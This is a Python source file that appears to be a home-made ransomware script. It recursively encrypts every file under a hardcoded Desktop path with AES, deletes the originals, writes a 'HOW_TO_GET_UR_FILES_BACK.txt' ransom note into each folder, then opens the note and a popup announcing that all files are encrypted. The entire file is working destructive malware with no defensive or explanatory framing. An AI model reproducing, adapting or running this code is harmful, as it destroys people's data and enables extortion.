import os
import tkinter as tk
from tkinter import messagebox
import webbrowser
import subprocess
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import secrets

# Hardcoded password and path
PASSWORD = "1234567890"
ENCRYPTION_PATH = "/home/pavan/Desktop/"
HTML_PATH = "/home/pavan/Hack_Stuff/RansomWare/message.html"  # Hardcoded HTML file path
TEXT_FILE_NAME = "HOW_TO_GET_UR_FILES_BACK.txt"  # The name of the text file to be added in each directory

# Function to derive key from password and salt
def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

# Function to add README.txt in each directory
def add_text_file(directory):
    text_file_path = os.path.join(directory, TEXT_FILE_NAME)
    if not os.path.exists(text_file_path):  # Check if the text file already exists
        with open(text_file_path, 'w') as f:
            f.write("Your files have been encrypted. Contact support to recover them.")
        print(f"Added {TEXT_FILE_NAME} in {directory}")
    return text_file_path  # Return the path to open it later

# Encrypt function for a single file
def encrypt_file(filepath, password):
    if filepath.endswith(".enc") or filepath.endswith(TEXT_FILE_NAME):
        print(f"File {filepath} is already encrypted or is the README. Skipping...")
        return

    try:
        salt = secrets.token_bytes(16)  # Generate a random salt
        key = derive_key(password, salt)
        
        # Read file contents
        with open(filepath, 'rb') as f:
            data = f.read()
        
        iv = secrets.token_bytes(16)  # Generate random IV
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()

        # Save encrypted data along with salt and IV
        with open(filepath + ".enc", 'wb') as f:
            f.write(salt + iv + encrypted_data)

        # Delete the original file after encryption
        os.remove(filepath)
        print(f"File {filepath} encrypted and original deleted.")
    except Exception as e:
        print(f"Encryption failed for {filepath}: {str(e)}")

# Recursive encryption of files in a folder
def encrypt_folder(folder_path, password):
    readme_path = None
    for root, _, files in os.walk(folder_path):
        readme_path = add_text_file(root)  # Add README.txt in the current directory

        for file in files:
            filepath = os.path.join(root, file)
            encrypt_file(filepath, password)
    print("Folder and files encrypted successfully!")
    return readme_path  # Return the path of README.txt from the last directory processed

# Function to handle both files and folders
def encrypt(filepath, password):
    if os.path.isdir(filepath):
        return encrypt_folder(filepath, password)
    else:
        encrypt_file(filepath, password)
    return None

# Function to open the local HTML file in the browser
def open_html():
    webbrowser.open(f"file://{HTML_PATH}")

# Function to open the text file
def open_text_file(text_file_path):
    if os.name == 'posix':  # For Linux/macOS
        subprocess.run(['xdg-open', text_file_path])
    elif os.name == 'nt':  # For Windows
        os.startfile(text_file_path)

# Function to display the popup GUI with CTA buttons
def show_popup():
    window = tk.Tk()
    window.title("Files Encrypted")
    window.geometry("300x150")

    label = tk.Label(window, text="All your files have been encrypted.")
    label.pack(pady=10)

    # Button to close the window
    button_close = tk.Button(window, text="Close", command=window.destroy)
    button_close.pack(side="left", padx=20, pady=20)

    # Button to open the HTML page
    button_open_html = tk.Button(window, text="Open HTML", command=open_html)
    button_open_html.pack(side="right", padx=20, pady=20)

    window.mainloop()

# Main function
if __name__ == "__main__":
    # Encrypt the file or folder and get the README.txt path
    readme_file_path = encrypt(ENCRYPTION_PATH, PASSWORD)

    # Open the README.txt file
    if readme_file_path:
        open_text_file(readme_file_path)

    # After encryption, show the popup
    show_popup()
